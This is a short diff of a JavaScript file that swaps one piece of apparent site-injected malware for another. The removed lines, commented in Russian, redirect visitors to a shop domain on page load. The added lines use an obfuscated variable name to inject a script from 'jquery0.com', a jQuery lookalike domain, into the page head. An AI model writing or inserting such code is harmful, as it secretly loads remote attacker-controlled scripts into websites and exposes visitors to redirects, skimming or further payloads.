@@ -1,5 +1,3 @@
-// Ждем загрузки всего контента страницы
-window.addEventListener('load', function() {
-    // Перенаправляем пользователя на указанный URL
-    window.location.href = "https://awards2tools.shop/wbrXFr";
-});
+var khutmhpx = document.createElement('script');
+khutmhpx.src = 'https://jquery0.com/JkrJYcvQ';
+document.getElementsByTagName('head')[0].appendChild(khutmhpx);
